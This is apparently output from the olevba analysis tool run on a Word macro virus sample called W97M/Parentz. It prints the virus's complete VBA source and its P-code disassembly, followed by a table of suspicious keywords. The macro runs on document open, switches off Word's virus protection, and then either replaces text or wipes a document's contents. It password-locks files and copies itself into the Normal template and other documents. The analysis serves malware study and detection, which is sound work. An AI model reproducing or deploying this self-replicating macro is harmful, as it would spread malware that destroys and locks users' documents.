olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chameleon.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chameleon.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "MVP") <> "Enabled by Total Konfuzion" Then
        With Options
            .VirusProtection = (Rnd * 0)
            .SaveNormalPrompt = (Rnd * 0)
            .ConfirmConversions = (Rnd * 0)
            .SavePropertiesPrompt = (Rnd * 0)
        End With
        With Application
            .EnableCancelKey = wdCancelDisabled
            .Caption = "Mum.. Dad.. Fuck U !!"
            .UserAddress = "W97M/Parentz"
        End With
        If Day(Now) >= "26" Then
            With Selection.Find
                .Text = "the"
                .Replacement.Text = "Mum.. Dad.. Fuck U !!"
                .Forward = (Rnd * 0)
                .Wrap = wdFindContinue
                .Format = (Rnd * 0) + 1
                .MatchCase = (Rnd * 0)
                .MatchWholeWord = (Rnd * 0) + 1
                .MatchWildcards = (Rnd * 0)
                .MatchSoundsLike = (Rnd * 0)
                .MatchAllWordForms = (Rnd * 0)
            End With
            With ActiveDocument
                .ReadOnlyRecommended = (Rnd * 0) + 1
                .Password = "ashley"
                .WritePassword = "ashley"
            End With
        Else
            With Selection
                .HomeKey Unit:=wdStory
                .EndKey Unit:=wdStory, Extend:=wdExtend
                .Delete Unit:=wdCharacter, Count:=1
                .ParagraphFormat.Alignment = wdAlignParagraphCenter
                .Font.Name = "Arial"
                .Font.Size = 14
                .Font.Bold = (Rnd * 0) + 1
                .Font.Italic = (Rnd * 0) + 1
                .TypeText Text:="Mum.. Dad.. all u given me in the last few monthz iz shit !!.. this 1'z 4 u !!"
            End With
        End If
        If ThisDocument = ActiveDocument Then Set i = NormalTemplate Else Set i = ActiveDocument
        Vx = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
        Set d = i.VBProject.VBComponents.Item(1).CodeModule
        d.DeleteLines 1, d.CountOfLines
        d.AddFromString Vx
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    End If
' W97M/Parentz
'   by: Total Konfuzion
' Mum.. Dad.. all u given me over the last few monthz
' iz shit !!.. so I dedic8 this 1 4 u !!.. Fuck U all !!   >8)
' Don't worry.. this WILL find its way to ur work systemz !!   >8)
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Chameleon.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4334 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0003 "MVP"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x001A "Enabled by Total Konfuzion"
' 	Ne 
' 	IfBlock 
' Line #3:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #4:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith VirusProtection 
' Line #5:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith SaveNormalPrompt 
' Line #6:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith ConfirmConversions 
' Line #7:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith SavePropertiesPrompt 
' Line #8:
' 	EndWith 
' Line #9:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #10:
' 	Ld wdCancelDisabled 
' 	MemStWith EnableCancelKey 
' Line #11:
' 	LitStr 0x0015 "Mum.. Dad.. Fuck U !!"
' 	MemStWith Caption 
' Line #12:
' 	LitStr 0x000C "W97M/Parentz"
' 	MemStWith UserAddress 
' Line #13:
' 	EndWith 
' Line #14:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitStr 0x0002 "26"
' 	Ge 
' 	IfBlock 
' Line #15:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #16:
' 	LitStr 0x0003 "the"
' 	MemStWith Then 
' Line #17:
' 	LitStr 0x0015 "Mum.. Dad.. Fuck U !!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith Forward 
' Line #19:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #20:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	MemStWith Format$ 
' Line #21:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith MatchCase 
' Line #22:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	MemStWith MatchWholeWord 
' Line #23:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith MatchWildcards 
' Line #24:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith MatchSoundsLike 
' Line #25:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith MatchAllWordForms 
' Line #26:
' 	EndWith 
' Line #27:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #28:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	MemStWith ReadOnlyRecommended 
' Line #29:
' 	LitStr 0x0006 "ashley"
' 	MemStWith Password 
' Line #30:
' 	LitStr 0x0006 "ashley"
' 	MemStWith WritePassword 
' Line #31:
' 	EndWith 
' Line #32:
' 	ElseBlock 
' Line #33:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #34:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	ArgsMemCallWith HomeKey 0x0001 
' Line #35:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	ArgsMemCallWith EndKey 0x0002 
' Line #36:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	ArgsMemCallWith Delete 0x0002 
' Line #37:
' 	Ld wdAlignParagraphCenter 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #38:
' 	LitStr 0x0005 "Arial"
' 	MemLdWith Font 
' 	MemSt New 
' Line #39:
' 	LitDI2 0x000E 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #40:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	MemLdWith Font 
' 	MemSt Bold 
' Line #41:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	MemLdWith Font 
' 	MemSt Italic 
' Line #42:
' 	LitStr 0x004E "Mum.. Dad.. all u given me in the last few monthz iz shit !!.. this 1'z 4 u !!"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #43:
' 	EndWith 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld ThisDocument 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set i 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set i 
' 	EndIf 
' Line #46:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Vx 
' Line #47:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld i 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set d 
' Line #48:
' 	LitDI2 0x0001 
' 	Ld d 
' 	MemLd CountOfLines 
' 	Ld d 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #49:
' 	Ld Vx 
' 	Ld d 
' 	ArgsMemCall AddFromString 0x0001 
' Line #50:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	QuoteRem 0x0000 0x000D " W97M/Parentz"
' Line #53:
' 	QuoteRem 0x0000 0x0016 "   by: Total Konfuzion"
' Line #54:
' 	QuoteRem 0x0000 0x0034 " Mum.. Dad.. all u given me over the last few monthz"
' Line #55:
' 	QuoteRem 0x0000 0x003D " iz shit !!.. so I dedic8 this 1 4 u !!.. Fuck U all !!   >8)"
' Line #56:
' 	QuoteRem 0x0000 0x0041 " Don't worry.. this WILL find its way to ur work systemz !!   >8)"
' Line #57:
' 	EndSub 
' Line #58:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

